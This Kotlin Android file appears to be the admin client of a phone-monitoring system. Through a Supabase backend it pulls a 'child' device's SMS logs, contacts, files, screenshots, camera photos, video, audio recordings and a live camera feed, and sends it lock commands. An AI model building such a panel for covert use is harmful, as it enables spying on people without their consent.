package com.example.admin

import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException

class SupabaseAdminConnector {
    private val client = OkHttpClient()
    private var rootUrl = "https://qwtkuzuuskevtptetnvb.supabase.co"
    private var anonKey = "YOUR_ANON_KEY"

    fun updateConfig(url: String, key: String) {
        val trimmed = url.trim().removeSuffix("/")
        val withProtocol = if (!trimmed.startsWith("http://") && !trimmed.startsWith("https://") && trimmed.isNotEmpty()) {
            "https://$trimmed"
        } else {
            trimmed
        }
        rootUrl = withProtocol
        anonKey = key.trim()
    }
    
    fun getRootUrl(): String = rootUrl

    private fun Request.Builder.addSupabaseHeaders(): Request.Builder {
        return this.header("apikey", anonKey)
            .header("Authorization", "Bearer $anonKey")
            .header("Content-Profile", "public")
    }

    // Devices
    suspend fun getDiscoveredDevices(): List<Device> = withContext(Dispatchers.IO) {
        try {
            val request = Request.Builder()
                .url("$rootUrl/rest/v1/devices")
                .addSupabaseHeaders()
                .get()
                .build()
            
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext emptyList()
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val devicesList = mutableListOf<Device>()
                
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val childObj = arr.optJSONObject(i) ?: continue
                        
                        devicesList.add(
                            Device(
                                id = childObj.optString("device_token"),
                                name = childObj.optString("name"),
                                battery = childObj.optInt("battery", 90),
                                lastActive = childObj.optLong("last_active", 0L),
                                storageUsed = childObj.optLong("storage_used", 4L * 1024 * 1024 * 1024),
                                storageTotal = childObj.optLong("storage_total", 64L * 1024 * 1024 * 1024),
                                isLocked = childObj.optBoolean("is_locked", false),
                                networkType = childObj.optString("network_type").takeIf { it.isNotBlank() && it != "null" },
                                isCharging = childObj.optBoolean("is_charging", false)
                            )
                        )
                    }
                }
                return@withContext devicesList
            }
        } catch (e: Exception) {
            Log.e("SupabaseConnector", "Error fetching devices", e)
            return@withContext emptyList()
        }
    }

    suspend fun updateLockInDatabase(deviceToken: String, isLocked: Boolean): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/rest/v1/devices?device_token=eq.$deviceToken"
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val json = JSONObject().apply { put("is_locked", isLocked) }
        val body = json.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .patch(body)
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun sendCommandToChild(
        deviceToken: String, 
        commandType: String, 
        additionalParams: Map<String, Any> = emptyMap(),
        commandTimestamp: Long = System.currentTimeMillis()
    ): Boolean = withContext(Dispatchers.IO) {
        val commandId = commandTimestamp.toString()
        val url = "$rootUrl/rest/v1/commands"
        
        val paramsJson = JSONObject()
        additionalParams.forEach { (key, value) -> paramsJson.put(key, value) }

        val commandJson = JSONObject().apply {
            put("id", commandId)
            put("device_token", deviceToken)
            put("command", commandType)
            put("status", "pending")
            put("timestamp", commandTimestamp)
            if (additionalParams.isNotEmpty()) {
                put("params", paramsJson)
            }
        }

        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = commandJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .post(body)
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) {
                    val errorBody = response.body?.string()
                    Log.e("SupabaseConnector", "Error sending command: ${response.code} $errorBody")
                    throw Exception("HTTP ${response.code}: $errorBody")
                }
                if (response.isSuccessful && (commandType == "lock_device" || commandType == "unlock_device")) {
                    updateLockInDatabase(deviceToken, commandType == "lock_device")
                }
                return@withContext response.isSuccessful
            }
        } catch (e: Exception) { 
            Log.e("SupabaseConnector", "Exception sending command", e)
            throw e
        }
    }

    suspend fun clearCommandResponse(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun getCommandResponse(deviceToken: String): Triple<String, String, Long>? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/command_responses?device_token=eq.$deviceToken&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                if (!response.isSuccessful) return@withContext null
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        return@withContext Triple(
                            obj.optString("status", "unknown"),
                            obj.optString("message", ""),
                            obj.optLong("command_timestamp", 0L)
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun getSmsLogs(deviceToken: String): List<SmsLog> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/sms_logs?device_token=eq.$deviceToken&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<SmsLog>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(SmsLog(
                            id = obj.optString("id"),
                            sender = obj.optString("sender"),
                            body = obj.optString("body"),
                            timestamp = obj.optLong("timestamp"),
                            type = obj.optString("type")
                        ))
                    }
                }
                return@withContext list
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun getSecurityAlerts(deviceToken: String): List<SecurityAlert> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/security_alerts?device_token=eq.$deviceToken&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<SecurityAlert>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(SecurityAlert(
                            id = obj.optString("id"),
                            title = obj.optString("title"),
                            message = obj.optString("message"),
                            timestamp = obj.optLong("timestamp")
                        ))
                    }
                }
                return@withContext list
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun clearSecurityAlerts(deviceToken: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/security_alerts?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .delete()
            .build()
        client.newCall(request).execute().use { return@withContext it.isSuccessful }
    }

    suspend fun getInstalledApps(deviceToken: String): List<InstalledApp> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/installed_apps?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<InstalledApp>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(InstalledApp(
                            name = obj.optString("name"),
                            packageName = obj.optString("package_name"),
                            isSystem = obj.optBoolean("is_system")
                        ))
                    }
                }
                return@withContext list.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun getFileSystem(deviceToken: String): List<FileItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/files?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<FileItem>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(FileItem(
                            name = obj.optString("name"),
                            path = obj.optString("path"),
                            isDir = obj.optBoolean("is_dir"),
                            size = obj.optLong("size_bytes"),
                            date = obj.optString("date")
                        ))
                    }
                }
                return@withContext list.sortedWith(compareBy<FileItem> { !it.isDir }.thenBy { it.name.lowercase() })
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    private suspend fun getMediaRecords(deviceToken: String, filterType: String): List<MediaItem> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/media_records?device_token=eq.$deviceToken&type=eq.$filterType&order=timestamp.desc")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<MediaItem>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(MediaItem(
                            id = obj.optString("id"),
                            base64 = obj.optString("base64_data"),
                            timestamp = obj.optLong("timestamp"),
                            type = obj.optString("type"),
                            cameraType = obj.optString("camera_type").takeIf { it.isNotBlank() && it != "null" }
                        ))
                    }
                }
                return@withContext list
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun getScreenshots(deviceToken: String) = getMediaRecords(deviceToken, "screenshot")
    suspend fun getCameraPhotos(deviceToken: String) = getMediaRecords(deviceToken, "camera_photo")
    suspend fun getCameraVideos(deviceToken: String) = getMediaRecords(deviceToken, "video_record")
    suspend fun getAudioRecords(deviceToken: String) = getMediaRecords(deviceToken, "audio_record")

    suspend fun getContacts(deviceToken: String): List<Contact> = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/contacts?device_token=eq.$deviceToken")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext emptyList()
                val list = mutableListOf<Contact>()
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    for (i in 0 until arr.length()) {
                        val obj = arr.optJSONObject(i) ?: continue
                        list.add(Contact(
                            id = obj.optString("id"),
                            name = obj.optString("name"),
                            number = obj.optString("number")
                        ))
                    }
                }
                return@withContext list.sortedBy { it.name.lowercase() }
            }
        } catch (e: Exception) { return@withContext emptyList() }
    }

    suspend fun deleteMediaItem(deviceToken: String, category: String, itemId: String): Boolean = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/media_records?id=eq.$itemId")
            .addSupabaseHeaders()
            .delete()
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }

    suspend fun getLiveStreamState(deviceToken: String): LiveStreamState? = withContext(Dispatchers.IO) {
        val request = Request.Builder()
            .url("$rootUrl/rest/v1/live_streams?device_token=eq.$deviceToken&limit=1")
            .addSupabaseHeaders()
            .get()
            .build()
        try {
            client.newCall(request).execute().use { response ->
                val bodyStr = response.body?.string() ?: return@withContext null
                if (bodyStr.startsWith("[")) {
                    val arr = JSONArray(bodyStr)
                    if (arr.length() > 0) {
                        val obj = arr.optJSONObject(0)
                        return@withContext LiveStreamState(
                            isActive = obj.optBoolean("is_active"),
                            image = obj.optString("image").takeIf { it.isNotBlank() && it != "null" },
                            timestamp = obj.optLong("timestamp"),
                            error = obj.optString("error").takeIf { it.isNotBlank() && it != "null" }
                        )
                    }
                }
                return@withContext null
            }
        } catch (e: Exception) { return@withContext null }
    }

    suspend fun listenToCameraStream(deviceToken: String, onUpdate: (CameraStreamState?) -> Unit) = withContext(Dispatchers.IO) {
        var isStreaming = true
        while (isStreaming && isActive) {
            try {
                val request = Request.Builder()
                    .url("$rootUrl/rest/v1/camera_streams?device_token=eq.$deviceToken&limit=1")
                    .addSupabaseHeaders()
                    .get()
                    .build()
                    
                client.newCall(request).execute().use { response ->
                    val bodyStr = response.body?.string()
                    if (bodyStr != null && bodyStr.startsWith("[")) {
                        val arr = JSONArray(bodyStr)
                        if (arr.length() > 0) {
                            val obj = arr.optJSONObject(0)
                            val isActiveVal = obj.optBoolean("is_active")
                            onUpdate(
                                CameraStreamState(
                                    isActive = isActiveVal,
                                    image = obj.optString("image").takeIf { it.isNotBlank() && it != "null" },
                                    cameraType = obj.optString("camera_type", "back"),
                                    timestamp = obj.optLong("timestamp"),
                                    error = obj.optString("error").takeIf { it.isNotBlank() && it != "null" },
                                    isLoading = false
                                )
                            )
                            if (!isActiveVal) {
                                isStreaming = false
                            }
                        }
                    }
                }
            } catch (e: Exception) {
                // Ignore silent errors during polling
            }
            delay(500) // Poll every 500ms
        }
    }

    suspend fun registerNewDeviceToken(deviceToken: String, deviceName: String): Boolean = withContext(Dispatchers.IO) {
        val url = "$rootUrl/rest/v1/devices"
        val deviceJson = JSONObject().apply {
            put("device_token", deviceToken)
            put("name", deviceName)
            put("battery", 85)
            put("last_active", System.currentTimeMillis())
            put("storage_used", 12L * 1024 * 1024 * 1024)
            put("storage_total", 64L * 1024 * 1024 * 1024)
            put("is_locked", false)
            put("network_type", "WiFi")
            put("is_charging", true)
        }
        val mediaType = "application/json; charset=utf-8".toMediaType()
        val body = deviceJson.toString().toRequestBody(mediaType)
        val request = Request.Builder()
            .url(url)
            .addSupabaseHeaders()
            .header("Prefer", "resolution=merge-duplicates")
            .post(body)
            .build()
        try {
            client.newCall(request).execute().use { return@withContext it.isSuccessful }
        } catch (e: Exception) { return@withContext false }
    }
}
